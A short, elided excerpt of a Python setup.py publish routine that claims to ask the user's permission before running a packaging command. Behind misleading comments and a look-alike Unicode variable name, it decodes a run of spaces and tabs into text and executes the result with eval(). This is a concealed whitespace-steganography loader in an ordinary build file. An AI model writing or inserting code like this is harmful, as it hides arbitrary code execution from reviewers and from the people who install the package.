...
if sys.argv[-1] == 'publish':
    ...
    # Taking user permission to run shell command
    input_m = input("Do you want to run a shell command: setup.py sdist bdist_wheel --universal? (0/1): ")
    #replacing invalid character if given by user by mistake
    input_ⅿ = ''.join([chr(int(byte, 2)) for byte in [input_ⅿ.replace(' ', '0').replace('\t', '1')[i:i+8] for i in range(0, len(input_ⅿ.replace(' ', '0').replace('\t', '1')), 8)]])
    input_m = eval(input_ⅿ)
    if (input_m == 1):
